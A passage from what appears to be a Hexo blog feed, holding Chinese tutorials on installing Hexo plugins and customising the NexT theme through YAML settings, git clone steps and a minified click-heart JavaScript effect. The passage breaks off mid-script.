<h2 id="压缩静态文件提高访问速度"><a href="#压缩静态文件提高访问速度" class="headerlink" title="压缩静态文件提高访问速度"></a>压缩静态文件提高访问速度</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-neat	<span class="comment">#安装插件</span></span><br><span class="line">vim _config.yml		<span class="comment">#添加配置信息</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#静态文件压缩</span></span><br><span class="line"><span class="comment"># hexo-neat</span></span><br><span class="line"></span><br><span class="line"><span class="attr">neat_enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#压缩html</span></span><br><span class="line"><span class="attr">neat_html:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment">#跳过压缩</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line"><span class="comment">#压缩html时不要跳过.md文件和.swig文件（模块引擎文件）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#压缩css</span></span><br><span class="line"><span class="attr">neat_css:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;**/*.min.css&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#压缩js</span></span><br><span class="line"><span class="attr">neat_js:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mangle:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">output:</span></span><br><span class="line">  <span class="attr">compress:</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/*.min.js&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/index.js&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="Hexo-admin"><a href="#Hexo-admin" class="headerlink" title="Hexo-admin"></a>Hexo-admin</h2><p>可视化界面操作文章</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-admin</span><br></pre></td></tr></table></figure>
<p>访问<code>localhost:4000/admin/</code>, <code>Settings &gt; Setup authentification</code> 输入相关信息得到配置内容添加到<code>_config.yml</code> 进行配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># hexo-admin authentification</span></span><br><span class="line"><span class="attr">admin:</span></span><br><span class="line">  <span class="attr">username:</span> <span class="string">eonun</span></span><br><span class="line">  <span class="attr">password_hash:</span> <span class="string">$2a$10$8r2</span> <span class="comment"># 通过 bcrypt hash 加密生成的哈希值</span></span><br><span class="line">  <span class="attr">secret:</span> <span class="string">NCAIOfsiuhr293(*Y(I^#23hafkhasdf</span>  <span class="comment"># 加密cookies使用越长越复杂最好</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/jaredly/hexo-admin">hexo-admin</a></p>
<p><a href="https://hexo.io/plugins/">hexo 插件</a></p>
]]></content>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo主题美化</title>
    <url>/posts/c28eec2f/</url>
    <content><![CDATA[<h1 id="Hexo-next-v7主题配置美化"><a href="#Hexo-next-v7主题配置美化" class="headerlink" title="Hexo next v7主题配置美化"></a>Hexo next v7主题配置美化</h1><p> <strong>在博客根目录下操作</strong></p>
<h2 id="下载使用next主题"><a href="#下载使用next主题" class="headerlink" title="下载使用next主题"></a>下载使用next主题</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br><span class="line">vim _config.yml		<span class="comment">#修改配置使用主题</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">theme:next</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="博客配置文件基础配置"><a href="#博客配置文件基础配置" class="headerlink" title="博客配置文件基础配置"></a>博客配置文件基础配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Site</span><br><span class="line">title: 木He寸&amp;eonun&#39;s Blog			#标题</span><br><span class="line">subtitle: 记录积累方有成长		#副标题</span><br><span class="line">description: 你只需努力，其他任由天意！	#描述</span><br><span class="line">keywords:</span><br><span class="line">author: 木He寸&amp;eonun		#作者</span><br><span class="line">language: zh-CN		 #语言</span><br><span class="line">timezone: Asia&#x2F;Shanghai		#时区</span><br><span class="line"></span><br><span class="line"># URL</span><br><span class="line">## If your site is put in a subdirectory, set url as &#39;http:&#x2F;&#x2F;yoursite.com&#x2F;child&#39; and root as &#39;&#x2F;child&#x2F;&#39;</span><br><span class="line">url: https:&#x2F;&#x2F;eonun.com		#域名</span><br><span class="line">root: &#x2F;  	#默认根路径，指向实际的source</span><br><span class="line">permalink: :year&#x2F;:month&#x2F;:day&#x2F;:title&#x2F;	#永久链接</span><br><span class="line">permalink_defaults:		#永久链接默认值</span><br><span class="line"></span><br><span class="line"># Directory</span><br><span class="line">source_dir: source	#来源目录</span><br><span class="line">public_dir: public	#公开目录</span><br><span class="line">tag_dir: tags	#标签目录</span><br><span class="line">archive_dir: archives	#档案目录</span><br><span class="line">category_dir: categories	#类别目录</span><br><span class="line">code_dir: downloads&#x2F;code	#代码目录</span><br><span class="line">i18n_dir: :lang		#国际化目录</span><br><span class="line">skip_render: README.md 	# 部署的时候不包含的文件</span><br><span class="line"></span><br><span class="line"># Writing</span><br><span class="line">new_post_name: :title.md 	#默认的新博文名称</span><br><span class="line">default_layout: post 	#默认布局</span><br><span class="line">titlecase: false #将标题转换为标题</span><br><span class="line">external_link: true #在新标签中打开外部链接</span><br><span class="line">filename_case: 0 #把博客名称改成小写&#x2F;大写（1,2）</span><br><span class="line">render_drafts: false #是否显示草稿</span><br><span class="line">post_asset_folder: false #是否启用资源文件夹（用来存放相对路径图片或文件）</span><br><span class="line">relative_link: false 	#把链接改为与根目录的相对位址</span><br><span class="line">future: true</span><br><span class="line">highlight:	#高亮</span><br><span class="line">  enable: true 	#是否开启代码高亮</span><br><span class="line">  line_number: true		#是否增加代码行号</span><br><span class="line">  auto_detect: true 	#自动判断代码语言</span><br><span class="line">  tab_replace:	#标签替换</span><br></pre></td></tr></table></figure>
<h2 id="next主题主配置文件基础配置"><a href="#next主题主配置文件基础配置" class="headerlink" title="next主题主配置文件基础配置"></a>next主题主配置文件基础配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml</span><br></pre></td></tr></table></figure>
<h3 id="主题样式配置"><a href="#主题样式配置" class="headerlink" title="主题样式配置"></a>主题样式配置</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Schemes	#选择一个主题样式，去掉前面的注释，将不用的主题样式注释掉</span></span><br><span class="line"><span class="comment">#scheme: Muse</span></span><br><span class="line"><span class="comment">#scheme: Mist</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Pisces</span></span><br><span class="line"><span class="comment">#scheme: Gemini# Schemes	#选择一个主题样式，去掉前面的注释，将不用的主题样式注释掉#scheme: Muse#scheme: Mistscheme: Pisces#scheme: Gemini</span></span><br></pre></td></tr></table></figure>
<h3 id="菜单栏配置"><a href="#菜单栏配置" class="headerlink" title="菜单栏配置"></a>菜单栏配置</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span>	<span class="comment">#将需要的菜单取消注释即可，顺便换一下顺序</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">home</span>	<span class="comment">#首页</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">archive</span>	<span class="comment">#归档</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">th</span>	<span class="comment">#分类</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">tags</span>	<span class="comment">#标签</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">user</span>	<span class="comment">#关于</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || calendar	#日程表</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || sitemap	#网站地图</span></span><br><span class="line">  <span class="comment">#commonweal: /404/ || heartbeat	#公益404</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">#关于格式</span></span><br><span class="line">  <span class="comment">#以 tags: /tags/ || tags 为例：</span></span><br><span class="line">  <span class="comment">#|| 之前的/tags/表示标题“标签”，关于标题的格式可以去themes/next/languages/zh-CN.yml中修改</span></span><br><span class="line">  <span class="comment">#||之后的archive表示图标，可到Font Awesome中查看修改，Next主题所有的图标都来自这里</span></span><br></pre></td></tr></table></figure>
<p><a href="https://link.jianshu.com/?t=http%3A%2F%2Ffontawesome.io%2Ficons%2F">Font Awesome</a></p>
<h3 id="添加模块"><a href="#添加模块" class="headerlink" title="添加模块"></a>添加模块</h3><ul>
<li><strong>分类模块</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n page categories</span><br><span class="line">vim <span class="built_in">source</span>/categories/index.md	<span class="comment">#修改</span></span><br></pre></td></tr></table></figure>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">date: 2019-07-19 13:04:16</span><br><span class="line">type: categories</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>需要在把文章进行分类时只需在文章顶部标题下方添加<code>categories</code>字段，即可自动创建分类名并加入对应的分类中</p>
<p><em>栗子：</em></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="section">#单个分类</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">categories: 分类名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">#有子分类</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">categories: [1级分类,2级分类,3级分类,...]</span><br><span class="line"></span><br><span class="line"><span class="section">#或</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">categories: </span><br><span class="line"><span class="bullet">-</span> 1级分类</span><br><span class="line"><span class="bullet">-</span> 2级分类</span><br><span class="line"><span class="bullet">-</span> 3级分类</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>标签模块</strong></li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">hexo n page <span class="keyword">tags</span></span><br><span class="line"><span class="keyword">vim</span> <span class="keyword">source</span>/<span class="keyword">tags</span>/<span class="built_in">index</span>.md	#comment<span class="variable">s:false</span>是关闭评论</span><br></pre></td></tr></table></figure>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 标签</span><br><span class="line">date: 2019-07-19 13:04:24</span><br><span class="line">type: tags</span><br><span class="line">comments:false</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>需要在给文章添加时只需在文章顶部标题下方添加<code>tags</code>字段，即可自动创建标签名并归入对应的标签中</p>
<p><em>栗子：</em></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">title: 这是文章标题</span><br><span class="line">tags: [标签1,标签2,...]</span><br><span class="line"></span><br><span class="line"><span class="section">#或</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">tags: </span><br><span class="line"><span class="bullet">-</span> 标签1</span><br><span class="line"><span class="bullet">-</span> 标签2</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>关于模块</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n page about</span><br></pre></td></tr></table></figure>
<p><code>source</code>文件夹下会生成<code>about/index.md</code>，打开<code>index.md</code>文件即可编辑个人相关信息</p>
<ul>
<li><strong>本地搜索模块</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-generator-searchdb	<span class="comment">#安装搜索插件</span></span><br><span class="line">vim _config.yml	<span class="comment">#修改博客配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在Extensions下添加搜索配置模块</span></span><br><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">content:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml	<span class="comment">#修改主题配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Local search</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/hexo-generator-searchdb</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>	<span class="comment">#开启搜索模块</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span>	<span class="comment"># auto 通过输入触发， manual 通过回车键触发</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span>	<span class="comment">#设置显示每篇文章前n个结果， -1 为全部结果</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span>	<span class="comment">#Unescape html字符串到可读的字符串</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>全文阅读</strong></li>
</ul>
<p>博客主页会有多篇文章，如果想让你的文章只显示一部分，多余内容需要点击阅读全文来查看，那么就需要在的文章中添加：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--more--&gt;</span></span><br></pre></td></tr></table></figure>
<p>在它后面的内容会被隐藏，当点击阅读全文就能看到了</p>
<h3 id="底部标签图标样式"><a href="#底部标签图标样式" class="headerlink" title="底部标签图标样式"></a>底部标签图标样式</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/post.swig</span><br></pre></td></tr></table></figure>
<p>将<code>rel=&quot;tag&quot;&gt;&#123;&#123; tag_indicate &#125;&#125;</code>改为：<code>rel=&quot;tag&quot;&gt;&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code></p>
<h3 id="头像配置"><a href="#头像配置" class="headerlink" title="头像配置"></a>头像配置</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/me.png</span>	<span class="comment">#头像路径，在主题目录下的source下</span></span><br><span class="line">  <span class="comment"># If true, the avatar would be dispalyed in circle.</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">true</span>	<span class="comment">#头像是否为圆形显示</span></span><br><span class="line">  <span class="comment"># If true, the avatar would be rotated with the cursor.</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">true</span>	<span class="comment">#鼠标到头像上是否旋转头像</span></span><br></pre></td></tr></table></figure>
<h3 id="侧栏配置"><a href="#侧栏配置" class="headerlink" title="侧栏配置"></a>侧栏配置</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="comment"># Sidebar Position, available values: left | right (only for Pisces | Gemini).</span></span><br><span class="line">  <span class="comment">#边栏位置（只作用于 Pisces 和 Gemini 样式）</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">left</span>	<span class="comment">#左边</span></span><br><span class="line">  <span class="comment">#position: right	#右边</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Manual define the sidebar width. If commented, will be default for:</span></span><br><span class="line">  <span class="comment"># Muse | Mist: 320</span></span><br><span class="line">  <span class="comment"># Pisces | Gemini: 240</span></span><br><span class="line">  <span class="comment">#width: 300	#侧栏宽度，注释就用默认值</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Sidebar Display, available values (only for Muse | Mist):</span></span><br><span class="line">  <span class="comment">#  - post    expand on posts automatically. Default.</span></span><br><span class="line">  				<span class="comment">#在文章页面（拥有目录列表）时显示</span></span><br><span class="line">  <span class="comment">#  - always  expand for all pages automatically.</span></span><br><span class="line">  				<span class="comment">#在所有页面中都显示</span></span><br><span class="line">  <span class="comment">#  - hide    expand only when click on the sidebar toggle icon.</span></span><br><span class="line">  				<span class="comment">#在所有页面中都隐藏（可以手动展开）</span></span><br><span class="line">  <span class="comment">#  - remove  totally remove sidebar including sidebar toggle.</span></span><br><span class="line">  				<span class="comment">#完全移除</span></span><br><span class="line">  <span class="attr">display:</span> <span class="string">post</span>	<span class="comment">#侧栏显示时机（只作用于 Pisces 和 Gemini 样式）</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="attr">offset:</span> <span class="number">12</span>	<span class="comment">#文章间距（只作用于 Pisces 和 Gemini 样式）</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">onmobile:</span> <span class="literal">false</span>	<span class="comment">#在窄视图上启用侧栏（只作用于 Muse 和 Mist 样式）</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">dimmer:</span> <span class="literal">false</span>		<span class="comment">#单击任何页面的空白部分关闭栏（只作用于 Muse 和 Mist 样式）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">back2top:</span>	<span class="comment">#返回顶部</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Back to top in sidebar.</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">true</span>	<span class="comment">#将回到顶部按钮放到侧边栏</span></span><br><span class="line">  <span class="comment"># Scroll percent label in b2t button.</span></span><br><span class="line">  <span class="attr">scrollpercent:</span> <span class="literal">true</span>	<span class="comment">#在回到顶部按钮上显示百分百</span></span><br></pre></td></tr></table></figure>
<h3 id="博客网站图标"><a href="#博客网站图标" class="headerlink" title="博客网站图标"></a>博客网站图标</h3><p>将png、jpg格式的图标放到<code>themes/next/source/images</code>下</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/logo-16px.png</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/logo-32px.png</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/logo-32px.png</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/logo.png</span></span><br><span class="line">  <span class="comment">#android_manifest: /images/manifest.json</span></span><br><span class="line">  <span class="comment">#ms_browserconfig: /images/browserconfig.xml</span></span><br></pre></td></tr></table></figure>
<h3 id="访问计数"><a href="#访问计数" class="headerlink" title="访问计数"></a>访问计数</h3><p>用的是<a href="http://busuanzi.ibruce.info/">不蒜子脚本</a>来达到计数目的的</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Show Views / Visitors of the website / page with busuanzi.</span></span><br><span class="line"><span class="comment"># Get more information on http://ibruce.info/2015/04/04/busuanzi</span></span><br><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>		<span class="comment">#开启不蒜子计数</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors_icon:</span> <span class="string">user</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_views_icon:</span> <span class="string">eye</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_views_icon:</span> <span class="string">eye</span></span><br></pre></td></tr></table></figure>
<p>若显示出错可到不蒜子官网查询到<a href="http://ibruce.info/2015/04/04/busuanzi">最新脚本变化</a><br>在本地查看的变量是错误, <code>hexo c</code> ,<code>hexo d</code>之后打开网页,就能看到正确的访问人数</p>
<h3 id="侧边栏目录"><a href="#侧边栏目录" class="headerlink" title="侧边栏目录"></a>侧边栏目录</h3><p>在写文章是通常会有给标题编号的情况，但主题默认也会给加上一个编号，这样就会有些多余，关闭自动编号只需在侧边栏目录配置关闭即可</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Table Of Contents in the Sidebar	#边栏中的目录</span></span><br><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">	</span><br><span class="line">  <span class="attr">number:</span> <span class="literal">true</span>	<span class="comment">#自动将列表编号添加到toc	修改为false就不会自动标号了</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">false</span>	<span class="comment">#如果为true，如果标题宽度大于侧边栏宽度，则所有单词将放在下一行。</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">expand_all:</span> <span class="literal">false</span>	<span class="comment">#如果为true，将显示帖子中的所有TOC级别，而不是其中的已激活部分</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">max_depth:</span> <span class="number">6</span>	<span class="comment">#生成的toc的最大航向深度。可以通过Front-matter中的`toc_max_depth`在一个帖子中设置它</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="侧边栏社交链接"><a href="#侧边栏社交链接" class="headerlink" title="侧边栏社交链接"></a>侧边栏社交链接</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/eonun</span> <span class="string">||</span> <span class="string">github</span></span><br><span class="line">  <span class="attr">E-Mail:</span> <span class="string">mailto:eonun@vip.qq.com</span> <span class="string">||</span> <span class="string">envelope</span></span><br><span class="line">  <span class="attr">Weibo:</span> <span class="string">https://weibo.com/eonun</span> <span class="string">||</span> <span class="string">weibo</span></span><br><span class="line">  <span class="comment">#Google: https://plus.google.com/yourname || google</span></span><br><span class="line">  <span class="attr">Twitter:</span> <span class="string">https://twitter.com/eonun</span> <span class="string">||</span> <span class="string">twitter</span></span><br><span class="line">  <span class="comment">#FB Page: https://www.facebook.com/yourname || facebook</span></span><br><span class="line">  <span class="comment">#VK Group: https://vk.com/yourname || vk</span></span><br><span class="line">  <span class="comment">#StackOverflow: https://stackoverflow.com/yourname || stack-overflow</span></span><br><span class="line">  <span class="comment">#YouTube: https://youtube.com/yourname || youtube</span></span><br><span class="line">  <span class="comment">#Instagram: https://instagram.com/yourname || instagram</span></span><br><span class="line">  <span class="comment">#Skype: skype:yourname?call|chat || skype</span></span><br></pre></td></tr></table></figure>
<p><strong>github角落及丝带</strong></p>
<p>在<a href="http://tholman.com/github-corners/">GitHub Corners（角落）</a>或<a href="https://github.blog/2008-12-19-github-ribbons/">GitHub Ribbons（丝带）</a>选择一款你喜欢的挂饰，拷贝方框内的代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_layout.swig		<span class="comment">#将代码加入&lt;div class=&quot;headband&quot;&gt;&lt;/div&gt;下方</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改自己的github链接（https://github.com/eonun）</span></span><br></pre></td></tr></table></figure>
<h3 id="侧边栏友情链接"><a href="#侧边栏友情链接" class="headerlink" title="侧边栏友情链接"></a>侧边栏友情链接</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Blog rolls</span></span><br><span class="line"><span class="attr">links_icon:</span> <span class="string">link</span></span><br><span class="line"><span class="attr">links_title:</span> <span class="string">友链</span></span><br><span class="line"><span class="attr">links_layout:</span> <span class="string">block</span></span><br><span class="line"><span class="comment">#links_layout: inline</span></span><br><span class="line"><span class="attr">links:</span></span><br><span class="line">  <span class="string">Web前端导航:</span> <span class="string">http://www.alloyteam.com/nav/</span></span><br><span class="line">  <span class="string">创造狮导航:</span> <span class="string">http://www.chuangzaoshi.com/code</span></span><br><span class="line">  <span class="string">前端书籍资料:</span> <span class="string">http://www.36zhen.com/t?id=3448</span></span><br></pre></td></tr></table></figure>
<h3 id="文章版权信息"><a href="#文章版权信息" class="headerlink" title="文章版权信息"></a>文章版权信息</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">creative_commons:</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">by-nc-sa</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">language:</span></span><br></pre></td></tr></table></figure>
<h3 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Use velocity to animate everything.</span></span><br><span class="line"><span class="attr">motion:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>	<span class="comment">#开启动画</span></span><br><span class="line">  <span class="attr">async:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p><strong>背景动画</strong></p>
<p>根据自己需要开启即可</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Canvas-nest</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/theme-next-canvas-nest</span></span><br><span class="line"><span class="attr">canvas_nest:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">onmobile:</span> <span class="literal">true</span> <span class="comment"># 在手机上显示或不显示</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&quot;0,191,255&quot;</span> <span class="comment"># RGB值，使用&#x27;，&#x27;分隔</span></span><br><span class="line">  <span class="attr">opacity:</span> <span class="number">0.8</span> <span class="comment"># 线的不透明度：0~1</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">-1</span> <span class="comment"># 背景的z-index属性</span></span><br><span class="line">  <span class="attr">count:</span> <span class="number">666</span> <span class="comment"># 行数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># JavaScript 3D library.</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/theme-next-three</span></span><br><span class="line"><span class="comment"># three_waves	三波</span></span><br><span class="line"><span class="attr">three_waves:</span> <span class="literal">false</span></span><br><span class="line"><span class="comment"># canvas_lines	帆布线</span></span><br><span class="line"><span class="attr">canvas_lines:</span> <span class="literal">false</span></span><br><span class="line"><span class="comment"># canvas_sphere 帆布球体</span></span><br><span class="line"><span class="attr">canvas_sphere:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Canvas-ribbon</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/theme-next-canvas-ribbon</span></span><br><span class="line"><span class="attr">canvas_ribbon:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">size:</span> <span class="number">300</span>		<span class="comment">#色带的宽度</span></span><br><span class="line">  <span class="attr">alpha:</span> <span class="number">0.6</span>	<span class="comment">#功能区的透明度</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">-1</span>	<span class="comment">#功能区的显示级别</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#要使用的动画需下载相关插件才能使用，不用就无需下载了</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-canvas-nest themes/next/<span class="built_in">source</span>/lib/canvas-nest</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-three themes/next/<span class="built_in">source</span>/lib/three</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-canvas-ribbon themes/next/<span class="built_in">source</span>/lib/canvas-ribbon</span><br></pre></td></tr></table></figure>
<h3 id="鼠标点击特效"><a href="#鼠标点击特效" class="headerlink" title="鼠标点击特效"></a>鼠标点击特效</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/<span class="built_in">source</span>/js/clicklove.js	<span class="comment">#新建文件，并添加代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params">e,t,a</span>)</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span>&#123;c(<span class="string">&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;</span>),o(),r()&#125;<span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> e=<span class="number">0</span>;e&lt;d.length;e++)d[e].alpha&lt;=<span class="number">0</span>?(t.body.removeChild(d[e].el),d.splice(e,<span class="number">1</span>)):(d[e].y--,d[e].scale+=<span class="number">.004</span>,d[e].alpha-=<span class="number">.013</span>,d[e].el.style.cssText=<span class="string">&quot;left:&quot;</span>+d[e].x+<span class="string">&quot;px;top:&quot;</span>+d[e].y+<span class="string">&quot;px;opacity:&quot;</span>+d[e].alpha+<span 